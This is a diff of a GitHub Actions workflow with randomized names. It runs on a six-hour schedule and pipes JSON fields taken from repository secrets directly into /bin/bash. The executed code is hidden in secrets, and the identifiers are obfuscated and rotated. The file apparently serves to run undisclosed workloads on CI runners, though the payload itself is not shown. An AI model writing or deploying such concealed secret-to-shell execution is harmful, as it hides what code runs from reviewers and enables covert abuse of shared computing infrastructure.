@@ -2,25 +2,28 @@ name: haoertong6352
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 2/6 * * *'
+    - cron: '3 2/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: haoertong6352
         env:
-          z088: ${{ secrets.z088 }}
+          fyogt8: ${{ secrets.fyogt8 }}
         run: |
-          echo $z088 | jq -r .coue6 | /bin/bash
-          echo $tmty3 | jq -r .cds0177 | /bin/bash
-          echo $yzrjc75197 | jq -r .jw462 | /bin/bash
-          echo $xoan05 | jq -r .hk930 | /bin/bash
-          echo $navz810 | jq -r .q89510 | /bin/bash
-          echo $w33 | jq -r .j790 | /bin/bash
-          echo $ol104 | jq -r .b5612 | /bin/bash
-          echo $dkcmh94425 | jq -r .r2 | /bin/bash
-          echo $fxhz1812 | jq -r .wctb9 | /bin/bash
+          echo $fyogt8 | jq -r .fbji4804 | /bin/bash
+          echo $sww89631 | jq -r .ed85 | /bin/bash
+          echo $lp409 | jq -r .j27813 | /bin/bash
+          echo $l332 | jq -r .j10 | /bin/bash
+          echo $bh4804 | jq -r .thkgs855 | /bin/bash
+          echo $mdkg8217 | jq -r .n04 | /bin/bash
+          echo $qufjj268 | jq -r .m81135 | /bin/bash
+          echo $iexp6565 | jq -r .zicd54538 | /bin/bash
+          echo $rql39 | jq -r .nvwzc6980 | /bin/bash
+          echo $ed52 | jq -r .m9 | /bin/bash
+          echo $zoib316 | jq -r .wxg01 | /bin/bash
+          echo $fonh6 | jq -r .nibjr299 | /bin/bash
+          echo $c3 | jq -r .xd3 | /bin/bash
 
